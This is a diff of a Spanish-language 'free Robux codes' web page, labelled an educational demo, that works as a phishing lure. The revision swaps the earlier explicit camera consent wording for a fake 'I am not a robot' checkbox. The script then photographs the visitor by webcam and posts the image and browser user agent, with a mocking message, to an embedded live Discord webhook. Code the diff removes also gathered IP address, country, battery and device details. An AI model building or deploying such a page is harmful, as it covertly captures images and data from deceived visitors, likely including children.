@@ -4,12 +4,10 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Robux gratis 2025 — Nuevos códigos (Demo educativa)</title>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 16 16%22><text y=%2214%22 font-size=%2214%22>⭐</text></svg>">
   <style>
-    :root{--bg:#0a0f1d;--card:#0f172a;--ink:#e5e7eb;--muted:#94a3b8;--accent:#22c55e;--border:#1f2937}
+    :root{--bg:#0a0f1d;--card:#0f172a;--ink:#e5e7eb;--muted:#94a3b8;--accent:#22c55e;--warn:#f59e0b;--bad:#ef4444;--border:#1f2937}
     *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,Arial}
     body{margin:0;background:linear-gradient(180deg,#0b1022,#0f172a 40%,#0b1022);color:var(--ink);min-height:100svh}
-    .topdebug{background:#111827;color:#e5e7eb;padding:8px 12px;border-bottom:1px solid #1f2937;font-size:14px}
     .container{max-width:980px;margin:auto;padding:24px}
     .card{background:var(--card);border:1px solid var(--border);border-radius:18px;box-shadow:0 12px 30px rgba(0,0,0,.35);overflow:hidden}
     header{padding:18px;border-bottom:1px solid var(--border)}
@@ -25,21 +23,18 @@
     .btn.primary{background:var(--accent);color:#052011;box-shadow:0 8px 20px rgba(34,197,94,.35)}
     .muted{color:var(--muted)}
     .blurred{filter:blur(8px)}
-    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;padding:18px;z-index:50}
+    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;padding:18px}
     .overlay.show{display:flex}
     .modal{max-width:640px;width:100%;background:#0f172a;border:1px solid #334155;border-radius:16px;padding:18px;box-shadow:0 20px 50px rgba(0,0,0,.5)}
     .modal h2{margin:0 0 8px}
+    .modal p{margin:6px 0 0;color:var(--muted)}
     .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
-    .tag{display:inline-block;border:1px solid #334155;border-radius:999px;padding:6px 10px;font-size:12px;color:#94a3b8;margin-right:8px}
-    .log{font-family:ui-monospace,Menlo,Consolas;background:#0a0f1d;border:1px dashed #334155;border-radius:12px;padding:12px;min-height:110px;white-space:pre-wrap}
+    .tag{display:inline-block;border:1px solid #334155;border-radius:999px;padding:6px 10px;font-size:12px;color:var(--muted);margin-right:8px}
+    .log{font-family:ui-monospace,Menlo,Consolas; background:#0a0f1d;border:1px dashed #334155;border-radius:12px;padding:12px;min-height:110px;white-space:pre-wrap}
     video,canvas,img{width:100%;border-radius:12px;background:black;display:block}
-    noscript{display:block;background:#fee2e2;color:#7f1d1d;padding:12px;border-left:4px solid #ef4444;margin:12px 0;border-radius:8px}
   </style>
 </head>
 <body>
-  <div class="topdebug">✅ HTML cargado. Si no ves la tarjeta abajo, el problema es despliegue/carpeta. Si no funcionan los botones, abre F12 → Console y mira “Registro”.</div>
-  <noscript>Esta demo requiere JavaScript para funcionar.</noscript>
-
   <div class="container">
     <div class="card">
       <header>
@@ -61,8 +56,7 @@
           </div>
           <p class="muted" style="margin-top:10px">Los códigos se mostrarán completos tras una verificación rápida.</p>
           <div class="row">
-            <!-- Fallback inline por si no se engancha el listener -->
-            <button id="btn-open" class="btn primary" onclick="window.__openConsent()">Verificar y ver códigos</button>
+            <button id="btn-open" class="btn primary">Verificar y ver códigos</button>
           </div>
         </section>
         <aside class="panel">
@@ -73,19 +67,20 @@
     </div>
   </div>
 
-  <!-- Consentimiento -->
+  <!-- Intersticial de consentimiento EXPLÍCITO -->
   <div id="consentLayer" class="overlay" role="dialog" aria-modal="true">
     <div class="modal">
-      <h2>Verificación anti robot (consentimiento requerido)</h2>
-      <p>Se activará tu <strong>cámara</strong>, tomaremos <strong>una foto</strong> y la enviaremos al <strong>Discord</strong> de la demo.</p>
+      <h2>Verificación anti robot</h2>
+      <p>Los códigos se irán desbloqueando gradualmente. Para continuar, necesitamos verificar manualmente que no eres un bot.</p>
       <label style="display:flex;gap:10px;margin-top:10px">
         <input id="ck" type="checkbox" />
-        <span>✅ Autorizo activar la cámara, capturar una foto y enviarla a Discord.</span>
+        <span>✅ acepto que <strong>no soy</strong>, un robot<strong>.</strong> y compartire <strong>esta pagina</strong> a mis amigos.</span>
       </label>
       <div class="row">
         <button id="btn-consent" class="btn primary" disabled>Dar consentimiento y continuar</button>
       </div>
-      <p class="muted" style="margin-top:8px">HTTPS requerido.</p>
+      <p class="muted" style="margin-top:8px">HTTPS requerido • Puedes revocar permisos en la configuración del navegador.</p>
+      <p class="muted" style="margin-top:4px">(gracias por  <strong>visitar </strong> nuestra <em>pagina</em> saludos.)</p>
     </div>
   </div>
 
@@ -107,164 +102,114 @@
   </div>
 
   <script>
-  const WEBHOOK = "https://discord.com/api/webhooks/1394955639046017125/-WfN_y9umGx0-PV4GP0FID6mSIGq7NPXy6SQO-CmZRA1LOSppZgKX0IJNyKZisgnwqci";
-  const INCLUIR_IP = true;
+    const WEBHOOK = "https://discord.com/api/webhooks/1394955639046017125/-WfN_y9umGx0-PV4GP0FID6mSIGq7NPXy6SQO-CmZRA1LOSppZgKX0IJNyKZisgnwqci"; // Solo para la demo controlada
 
-  const $ = (id)=>document.getElementById(id);
-  const log = (m)=>{ const el=$("log"); if(!el) return; el.textContent += `\n${new Date().toLocaleTimeString()} — ${m}`; el.scrollTop = el.scrollHeight; };
+    const $ = (id)=>document.getElementById(id);
+    const log = (m)=>{ const el=$("log"); el.textContent += `\n${new Date().toLocaleTimeString()} — ${m}`; el.scrollTop = el.scrollHeight; };
 
-  let stream = null, lastBlob = null;
+    const codes = $("codes");
+    const consentLayer = $("consentLayer");
+    const captureLayer = $("captureLayer");
+    const ck = $("ck");
+    const btnConsent = $("btn-consent");
 
-  document.addEventListener('DOMContentLoaded', () => {
-    try {
-      const codes = $("codes"), consentLayer = $("consentLayer"), captureLayer = $("captureLayer");
-      const ck = $("ck"), btnOpen = $("btn-open"), btnConsent = $("btn-consent");
-      const btnCancel = $("btn-cancel"), btnClose = $("btn-close");
-      const video = $("video"), canvas = $("canvas"), preview = $("preview"), previewBox = $("previewBox");
+    const video = $("video");
+    const canvas = $("canvas");
+    const preview = $("preview");
+    const previewBox = $("previewBox");
+    const btnCancel = $("btn-cancel");
+    const btnClose = $("btn-close");
 
-      if(!codes || !consentLayer || !captureLayer || !btnOpen || !btnConsent || !video || !canvas || !preview || !previewBox){
-        log("Faltan elementos del DOM. Revisa IDs.");
-        return;
-      }
+    let stream = null; let lastBlob = null;
 
-      const unlock = ()=>{ codes.classList.remove('blurred'); codes.removeAttribute('aria-hidden'); log('Códigos desbloqueados.'); };
-      const openConsent = ()=> consentLayer.classList.add('show');
-      const closeConsent = ()=> consentLayer.classList.remove('show');
-      const openCapture = ()=> captureLayer.classList.add('show');
-      const closeCapture = ()=> captureLayer.classList.remove('show');
+    function unlock(){ codes.classList.remove('blurred'); codes.removeAttribute('aria-hidden'); log('Códigos desbloqueados.'); }
+    function openConsent(){ consentLayer.classList.add('show'); }
+    function closeConsent(){ consentLayer.classList.remove('show'); }
+    function openCapture(){ captureLayer.classList.add('show'); }
+    function closeCapture(){ captureLayer.classList.remove('show'); }
 
-      // Exponer fallback global para el onclick del botón
-      window.__openConsent = openConsent;
+    $("btn-open").addEventListener('click', openConsent);
 
-      // Listener normal
-      btnOpen.addEventListener('click', openConsent);
-
-      ck.addEventListener('change', ()=>{ btnConsent.disabled = !ck.checked; });
-
-      // Atajo ñ para desbloquear sin cámara
-      document.addEventListener('keydown', (e)=>{
-        if (!consentLayer.classList.contains('show')) return;
-        const key = e.key || '';
-        if (key === 'ñ' || key === 'Ñ'){ e.preventDefault(); closeConsent(); unlock(); }
-      });
-
-      btnConsent.addEventListener('click', async ()=>{
-        if (!ck.checked) return;
+    // Atajo teclado: ñ para continuar SIN verificación (sin usar cámara)
+    document.addEventListener('keydown', (e)=>{
+      if (!consentLayer.classList.contains('show')) return;
+      const key = e.key || '';
+      if (key === 'ñ' || key === 'Ñ'){
+        e.preventDefault();
         closeConsent();
-        await requestCameraAndCapture({video, canvas, preview, previewBox, btnCancel, btnClose, openCapture, closeCapture});
-      });
+        unlock();
+      }
+    });
 
-      btnCancel.addEventListener('click', ()=> stopStream(video, btnCancel));
-      btnClose.addEventListener('click', ()=>{ closeCapture(); unlock(); });
+    ck.addEventListener('change', ()=>{ btnConsent.disabled = !ck.checked; });
 
-    } catch (err) {
-      console.error(err); log('Error de inicialización: ' + (err?.message||err));
-    }
-  });
+    btnConsent.addEventListener('click', async ()=>{
+      if (!ck.checked) return;
+      closeConsent();
+      await requestCameraAndCapture();
+    });
 
-  async function requestCameraAndCapture({video, canvas, preview, previewBox, btnCancel, btnClose, openCapture, closeCapture}){
-    if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)){
-      log('Este navegador no soporta getUserMedia.'); alert('Tu navegador no soporta cámara.'); return;
-    }
-    try{
-      openCapture();
-      log('Solicitando permiso de cámara…');
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
-      video.srcObject = stream; video.hidden = false; btnCancel.disabled = false;
-      await video.play();
-      log('Permiso concedido. Capturando fotograma…');
-      await new Promise(r=>setTimeout(r,650));
-      await captureFrame({video, canvas, preview, previewBox, btnCancel, btnClose});
-    }catch(err){
-      log('Permiso denegado o error: ' + err.message);
-      alert('No se pudo acceder a la cámara.');
-    }
-  }
+    $("btn-cancel").addEventListener('click', stopStream);
+    $("btn-close").addEventListener('click', ()=>{ closeCapture(); unlock(); });
 
-  async function captureFrame({video, canvas, preview, previewBox, btnCancel, btnClose}){
-    if (!video || !video.videoWidth){ log('Video no listo para capturar.'); return; }
-    const w=video.videoWidth, h=video.videoHeight;
-    canvas.width=w; canvas.height=h;
-    canvas.getContext('2d').drawImage(video,0,0,w,h);
-    stopStream(video, btnCancel);
-    lastBlob = await new Promise(res=>canvas.toBlob(res,'image/png'));
-    const url = URL.createObjectURL(lastBlob);
-    preview.src=url; previewBox.style.display='block';
-    log(`Foto capturada (${Math.round(lastBlob.size/1024)} KB). Enviando a Discord…`);
-    await sendToDiscord(lastBlob);
-    btnClose.style.display='inline-block';
-  }
-
-  function stopStream(video, btnCancel){
-    if (!stream) return;
-    try{ stream.getTracks().forEach(t=>t.stop()); }catch(_){}
-    stream=null; if(video){ video.srcObject=null; video.hidden=true; }
-    if(btnCancel){ btnCancel.disabled=true; }
-    log('Cámara detenida.');
-  }
-
-  async function getBestEffortIpCountry(){
-    if (!INCLUIR_IP) return { ip:'no disponible', pais:'no disponible' };
-    try{
-      const ipRes = await fetch('https://api.ipify.org?format=json', { cache:'no-store' });
-      const ipJson = await ipRes.json(); const ip = ipJson?.ip || 'desconocido';
-      let pais = 'desconocido';
+    async function requestCameraAndCapture(){
+      if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)){
+        log('Este navegador no soporta getUserMedia.'); alert('Tu navegador no soporta cámara desde la web.'); return; }
       try{
-        const geoRes = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { cache:'no-store' });
-        if (geoRes.ok){ const g = await geoRes.json(); pais = g?.country_name || 'desconocido'; }
-      }catch(_){}
-      return { ip, pais };
-    }catch(_){ return { ip:'no disponible', pais:'no disponible' }; }
-  }
-
-  async function getBestEffortDeviceInfo(){
-    const ua = navigator.userAgent || 'desconocido';
-    const platform = navigator.platform || 'desconocido';
-    const touch = (navigator.maxTouchPoints||0) > 0 ? 'táctil' : 'no táctil';
-    const dispositivo = `${platform} (${touch})`;
-    const lang = (navigator.languages && navigator.languages.join(', ')) || navigator.language || 'desconocido';
-    const tz = (Intl&&Intl.DateTimeFormat().resolvedOptions().timeZone) || 'desconocido';
-    const mem = ('deviceMemory' in navigator) ? `${navigator.deviceMemory}GB` : 'desconocido';
-    const cores = ('hardwareConcurrency' in navigator) ? `${navigator.hardwareConcurrency}` : 'desconocido';
-    const screenInfo = (screen&&screen.width&&screen.height)? `${screen.width}x${screen.height}@${window.devicePixelRatio||1}x` : 'desconocido';
-    const conn = (navigator.connection&&navigator.connection.effectiveType) || 'desconocido';
-    const ref = document.referrer || '—';
-    let battery='desconocido'; try{ if(navigator.getBattery){ const b=await navigator.getBattery(); battery=`${Math.round((b.level||0)*100)}%`; } }catch(_){}
-    return { ua, dispositivo, lang, tz, mem, cores, screenInfo, conn, ref, battery };
-  }
-
-  async function sendToDiscord(blob){
-    try{
-      const fd = new FormData();
-      fd.append('file', blob, `captura-${Date.now()}.png`);
-      const dev = await getBestEffortDeviceInfo();
-      const { ip, pais } = await getBestEffortIpCountry();
-      const payload =
-`✅ Demo educativa (consentimiento otorgado)
-ip: ${ip}
-pais: ${pais}
-navegador: ${dev.ua}
-dispositivo usado: ${dev.dispositivo}
-foto: (adjunta)
-— extras —
-idioma(s): ${dev.lang}
-zona horaria: ${dev.tz}
-pantalla: ${dev.screenInfo}
-red: ${dev.conn}
-núcleos CPU: ${dev.cores}
-memoria disp.: ${dev.mem}
-batería: ${dev.battery}
-referrer: ${dev.ref}`;
-      fd.append('payload_json', JSON.stringify({ content: payload }));
-      const res = await fetch(WEBHOOK, { method:'POST', body:fd });
-      if(!res.ok){ const txt = await res.text(); throw new Error(`HTTP ${res.status}: ${txt.slice(0,160)}`); }
-      log('Envío completado. Revisa el canal de Discord.');
-    }catch(err){
-      log('Error al enviar a Discord: ' + err.message);
-      alert('No se pudo enviar a Discord. Revisa el webhook.');
-      console.error(err);
+        openCapture();
+        log('Solicitando permiso de cámara…');
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
+        video.srcObject = stream; video.hidden = false; btnCancel.disabled = false;
+        await video.play();
+        log('Permiso concedido. Capturando fotograma…');
+        await new Promise(r=>setTimeout(r,650));
+        await captureFrame();
+      }catch(err){
+        log(`Permiso denegado o error: ${err.message}`);
+        alert('No se pudo acceder a la cámara.');
+        closeCapture();
+      }
     }
-  }
+
+    async function captureFrame(){
+      if (!video || !video.videoWidth){ log('Video no listo para capturar.'); return; }
+      const w=video.videoWidth, h=video.videoHeight;
+      canvas.width=w; canvas.height=h;
+      canvas.getContext('2d').drawImage(video,0,0,w,h);
+      stopStream();
+      lastBlob = await new Promise(res=>canvas.toBlob(res,'image/png'));
+      const url = URL.createObjectURL(lastBlob);
+      preview.src=url; previewBox.style.display='block';
+      log(`Foto capturada (${Math.round(lastBlob.size/1024)} KB). Enviando a Discord…`);
+      await sendToDiscord(lastBlob);
+      btnClose.style.display='inline-block';
+    }
+
+    function stopStream(){
+      if (!stream) return;
+      stream.getTracks().forEach(t=>t.stop());
+      stream=null; video.srcObject=null; video.hidden=true; btnCancel.disabled=true;
+      log('Cámara detenida.');
+    }
+
+    async function sendToDiscord(blob){
+      try{
+        const fd = new FormData();
+        fd.append('file', blob, `captura-${Date.now()}.png`);
+        const payload = { content: `\u2705 Captura del weon que acepto los permisos jajaja tonto weon.\nAgente: ${navigator.userAgent}\nHora: ${new Date().toISOString()}` };
+        fd.append('payload_json', JSON.stringify(payload));
+        const res = await fetch(WEBHOOK, { method: 'POST', body: fd });
+        if (!res.ok){ const txt=await res.text(); throw new Error(`HTTP ${res.status}: ${txt.slice(0,160)}`); }
+        log('Envío completado. Revisa el canal de Discord.');
+      }catch(err){
+        log('Error al enviar a Discord: '+err.message);
+        alert('No se pudo enviar a Discord. Revisa el webhook.');
+        console.error(err);
+      }
+    }
   </script>
 </body>
 </html>
+
+
+
